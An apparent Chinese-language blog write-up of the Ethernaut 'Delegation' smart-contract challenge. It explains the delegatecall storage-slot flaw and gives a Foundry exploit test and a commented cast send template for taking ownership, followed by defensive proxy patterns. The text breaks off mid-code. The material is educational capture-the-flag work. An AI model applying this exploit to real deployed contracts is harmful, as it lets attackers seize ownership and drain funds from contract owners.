title=\"🏛️ 实际应用场景\"></a>🏛️ 实际应用场景</h2><h3 id=\"代理模式的正确使用\"><a href=\"#代理模式的正确使用\" class=\"headerlink\" title=\"代理模式的正确使用\"></a>代理模式的正确使用</h3><ol>\n<li><p><strong>升级模式</strong>：</p>\n<ul>\n<li>UUPS (Universal Upgradeable Proxy Standard)</li>\n<li>Transparent Proxy Pattern</li>\n<li>Beacon Proxy Pattern</li>\n</ul>\n</li>\n<li><p><strong>钻石模式</strong> (EIP-2535)：</p>\n<ul>\n<li>多面切割合约</li>\n<li>功能模块化</li>\n</ul>\n</li>\n<li><p><strong>最小代理</strong> (EIP-1167)：</p>\n<ul>\n<li>Clone Factory Pattern</li>\n<li>节省部署成本</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Delegation 关卡揭示了 <code>delegatecall</code> 的双刃剑特性：</p>\n<ul>\n<li>✅ <strong>理解上下文切换机制</strong> - 代码在不同存储空间执行</li>\n<li>✅ <strong>掌握存储槽布局匹配</strong> - 代理和实现必须一致</li>\n<li>✅ <strong>学习安全代理模式</strong> - 使用标准化解决方案</li>\n<li>✅ <strong>认识函数选择器安全</strong> - 控制可调用的函数</li>\n</ul>\n<p><code>delegatecall</code> 是实现合约升级和模块化的重要工具，但也是许多安全漏洞的根源。理解其工作原理对于构建安全的可升级合约至关重要。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">上一关: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">下一关: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/4.x/api/proxy\">OpenZeppelin 代理文档</a></strong></li>\n<li><strong><a href=\"https://eips.ethereum.org/EIPS/eip-1967\">EIP-1967: Standard Proxy Storage Slots</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>在智能合约的世界中，上下文就是一切。</em> 🔄</p>\n","more":"<h1 id=\"🎯-Ethernaut-Level-6-Delegation-delegatecall-存储槽攻击\"><a href=\"#🎯-Ethernaut-Level-6-Delegation-delegatecall-存储槽攻击\" class=\"headerlink\" title=\"🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击\"></a>🎯 Ethernaut Level 6: Delegation - delegatecall 存储槽攻击</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/6\">Ethernaut Level 6 - Delegation</a><br><strong>攻击类型</strong>: delegatecall 存储槽攻击<br><strong>难度</strong>: ⭐⭐⭐⭐☆<br><strong>核心概念</strong>: 存储上下文切换、代理模式安全</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这个关卡考验对 <code>delegatecall</code> 机制的深入理解：</p>\n<ol>\n<li><strong>获取合约控制权</strong> - 成为 <code>Delegation</code> 合约的 <code>owner</code></li>\n<li><strong>理解上下文切换</strong> - 掌握 <code>delegatecall</code> 的存储机制</li>\n<li><strong>学习代理模式风险</strong> - 了解升级模式的安全隐患</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegate &#123;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _owner) &#123;</span><br><span class=\"line\">        owner = _owner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function pwn() public &#123;</span><br><span class=\"line\">        owner = msg.sender;  // 🎯 目标函数：会修改 owner</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Delegation &#123;</span><br><span class=\"line\">    address public owner;      // 🚨 存储槽 0</span><br><span class=\"line\">    Delegate delegate;         // 🚨 存储槽 1</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _delegateAddress) &#123;</span><br><span class=\"line\">        delegate = Delegate(_delegateAddress);</span><br><span class=\"line\">        owner = msg.sender;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        // 🚨 危险的 delegatecall</span><br><span class=\"line\">        (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class=\"line\">        if (result) &#123;</span><br><span class=\"line\">            this;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"核心概念：delegatecall-vs-call\"><a href=\"#核心概念：delegatecall-vs-call\" class=\"headerlink\" title=\"核心概念：delegatecall vs call\"></a>核心概念：delegatecall vs call</h3><table>\n<thead>\n<tr>\n<th>调用方式</th>\n<th>执行上下文</th>\n<th>存储修改</th>\n<th>msg.sender</th>\n<th>使用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>call</strong></td>\n<td>被调用合约</td>\n<td>被调用合约</td>\n<td>调用合约地址</td>\n<td>普通外部调用</td>\n</tr>\n<tr>\n<td><strong>delegatecall</strong></td>\n<td>调用合约</td>\n<td>调用合约</td>\n<td>原始调用者</td>\n<td>代理模式、升级</td>\n</tr>\n</tbody></table>\n<h3 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h3><p><strong>delegatecall 的工作机制</strong>：</p>\n<ul>\n<li>执行<strong>被调用合约的代码</strong></li>\n<li>使用<strong>调用合约的存储</strong></li>\n<li>保持<strong>原始的 msg.sender</strong></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 当 Delegation 合约执行 delegatecall 时：</span><br><span class=\"line\">delegate.delegatecall(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">// 实际执行：</span><br><span class=\"line\">// 1. 运行 Delegate.pwn() 的代码</span><br><span class=\"line\">// 2. 但是在 Delegation 合约的存储上下文中</span><br><span class=\"line\">// 3. owner = msg.sender; 修改的是 Delegation.owner (存储槽0)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"存储槽布局分析\"><a href=\"#存储槽布局分析\" class=\"headerlink\" title=\"存储槽布局分析\"></a>存储槽布局分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Delegate 合约存储布局</span><br><span class=\"line\">// 槽 0: address owner</span><br><span class=\"line\"></span><br><span class=\"line\">// Delegation 合约存储布局  </span><br><span class=\"line\">// 槽 0: address owner     ← 这个会被 delegatecall 修改！</span><br><span class=\"line\">// 槽 1: Delegate delegate</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击路径\"><a href=\"#攻击路径\" class=\"headerlink\" title=\"攻击路径\"></a>攻击路径</h3><ol>\n<li><strong>构造函数调用数据</strong> - 编码 <code>pwn()</code> 函数选择器</li>\n<li><strong>触发 fallback 函数</strong> - 向合约发送带数据的交易</li>\n<li><strong>执行 delegatecall</strong> - 在 Delegation 存储上下文中执行 <code>pwn()</code></li>\n<li><strong>获得控制权</strong> - <code>owner</code> 被设置为攻击者地址</li>\n</ol>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Delegation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DelegationTest is Test &#123;</span><br><span class=\"line\">    Delegate public delegate;</span><br><span class=\"line\">    Delegation public delegation;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public deployer = makeAddr(&quot;deployer&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        vm.startPrank(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署 Delegate 合约</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署 Delegation 合约</span><br><span class=\"line\">        delegation = new Delegation(address(delegate));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDelegationExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;Initial owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attacker address:&quot;, attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 🎯 关键攻击：构造 pwn() 函数调用</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 fallback 函数触发 delegatecall</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Attack failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(delegation.owner(), attacker);</span><br><span class=\"line\">        console.log(&quot;New owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Attack successful!&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderstandDelegatecall() public &#123;</span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== Before Attack ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner());</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 直接调用 delegate.pwn() 只会修改 delegate 的存储</span><br><span class=\"line\">        delegate.pwn();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After direct call to Delegate.pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // 不变</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // 变为 attacker</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 重置状态</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        vm.prank(deployer);</span><br><span class=\"line\">        delegate = new Delegate(deployer);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 通过 delegatecall 调用 pwn()</span><br><span class=\"line\">        bytes memory payload = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        (bool success,) = address(delegation).call(payload);</span><br><span class=\"line\">        require(success, &quot;Delegatecall failed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== After delegatecall to pwn() ===&quot;);</span><br><span class=\"line\">        console.log(&quot;Delegation owner:&quot;, delegation.owner()); // 变为 attacker!</span><br><span class=\"line\">        console.log(&quot;Delegate owner:&quot;, delegate.owner());     // 不变</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testFunctionSelector() public view &#123;</span><br><span class=\"line\">        // 演示函数选择器的计算</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.log(&quot;pwn() selector:&quot;);</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bytes memory encoded = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">        console.log(&quot;Encoded call data:&quot;);</span><br><span class=\"line\">        console.logBytes(encoded);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"手动攻击脚本\"><a href=\"#手动攻击脚本\" class=\"headerlink\" title=\"手动攻击脚本\"></a>手动攻击脚本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 如果需要手动攻击，可以使用 cast 命令</span><br><span class=\"line\">contract ManualAttack is Test &#123;</span><br><span class=\"line\">    function testManualAttack() public &#123;</span><br><span class=\"line\">        // 1. 计算函数选择器</span><br><span class=\"line\">        bytes4 selector = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">        console.logBytes4(selector);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. 使用 cast 发送交易</span><br><span class=\"line\">        // cast send &lt;DELEGATION_ADDRESS&gt; &lt;SELECTOR&gt; --private-key &lt;YOUR_KEY&gt;</span><br><span class=\"line\">        // 例如：cast send 0x... 0xdd365b8b --private-key ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行 Delegation 攻击测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract DelegationTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 预期输出：</span></span><br><span class=\"line\"><span class=\"comment\"># Initial owner: 0x... (deployer)</span></span><br><span class=\"line\"><span class=\"comment\"># Attacker address: 0x... (attacker) </span></span><br><span class=\"line\"><span class=\"comment\"># New owner: 0x... (attacker)</span></span><br><span class=\"line\"><span class=\"comment\"># Attack successful!</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-严格的存储布局匹配\"><a href=\"#1-严格的存储布局匹配\" class=\"headerlink\" title=\"1. 严格的存储布局匹配\"></a>1. 严格的存储布局匹配</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeProxy &#123;</span><br><span class=\"line\">    // ✅ 确保代理和实现合约有相同的存储布局</span><br><span class=\"line\">    address public owner;           // 槽 0</span><br><span class=\"line\">    address public implementation; // 槽 1</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function upgrade(address newImplementation) public onlyOwner &#123;</span><br><span class=\"line\">        implementation = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        address impl = implementation;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // 使用内联汇编进行更安全的 delegatecall</span><br><span class=\"line\">            calldatacopy(0, 0, calldatasize())</span><br><span class=\"line\">            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)</span><br><span class=\"line\">            returndatacopy(0, 0, returndatasize())</span><br><span class=\"line\">            </span><br><span class=\"line\">            switch result</span><br><span class=\"line\">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class=\"line\">            default &#123; return(0, returndatasize()) &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-OpenZeppelin-的代理模式\"><a href=\"#2-使用-OpenZeppelin-的代理模式\" class=\"headerlink\" title=\"2. 使用 OpenZeppelin 的代理模式\"></a>2. 使用 OpenZeppelin 的代理模式</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&quot;;</span><br><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureUpgradeableContract &#123;</span><br><span class=\"line\">    // 使用 OpenZeppelin 的标准化代理实现</span><br><span class=\"line\">    // 包含完整的安全检查和存储隔离</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-函数选择器白名单\"><a href=\"#3-函数选择器白名单\" class=\"headerlink\" title=\"3. 函数选择器白名单\"></a>3. 函数选择器白名单</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract RestrictedDelegation &#123;</span><br><span class=\"line\">    mapping(bytes4 =&gt; bool) public allowedSelectors;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        // 只允许特定函数被 delegatecall</span><br><span class=\"line\">        allowedSelectors[bytes4(keccak256(&quot;safeFunction()&quot;))] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        bytes4 selector = bytes4(msg.data);</span><br><span class=\"line\">        require(allowedSelectors[selector], &quot;Function not allowed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行 delegatecall</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-存储槽隔离\"><a href=\"#4-存储槽隔离\" class=\"headerlink\" title=\"4. 存储槽隔离\"></a>4. 存储槽隔离</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract IsolatedStorage &#123;</span><br><span class=\"line\">    // 使用 EIP-1967 标准存储槽</span><br><span class=\"line\">    bytes32 private constant IMPLEMENTATION_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    bytes32 private constant ADMIN_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.admin&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _getImplementation() internal view returns (address) &#123;</span><br><span class=\"line\">        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _setImplementation(address newImplementation) internal &#123;</span><br><span class=\"line\">        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-EVM-调用类型对比\"><a href=\"#1-EVM-调用类型对比\" class=\"headerlink\" title=\"1. EVM 调用类型对比\"></a>1. EVM 调用类型对比</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CallExample &#123;</span><br><span class=\"line\">    function demonstrateCalls(address target) public &#123;</span><br><span class=\"line\">        // 1. call - 普通外部调用</span><br><span class=\"line\">        (bool success1,) = target.call(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. delegatecall - 委托调用</span><br><span class=\"line\">        (bool success2,) = target.delegatecall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 3. staticcall - 只读调用</span><br><span class=\"line\">        (bool success3,) = target.staticcall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;viewFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-存储槽冲突示例\"><a href=\"#2-存储槽冲突示例\" class=\"headerlink\" title=\"2. 存储槽冲突示例\"></a>2. 存储槽冲突示例</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 危险：不匹配的存储布局</span><br><span class=\"line\">contract ProxyV1 &#123;</span><br><span class=\"line\">    address public owner;    // 槽 0</span><br><span class=\"line\">    uint256 public value;    // 槽 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV1 &#123;</span><br><span class=\"line\">    uint256 public data;     // 槽 0 ← 冲突！</span><br><span class=\"line\">    address public admin;    // 槽 1 ← 冲突！</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 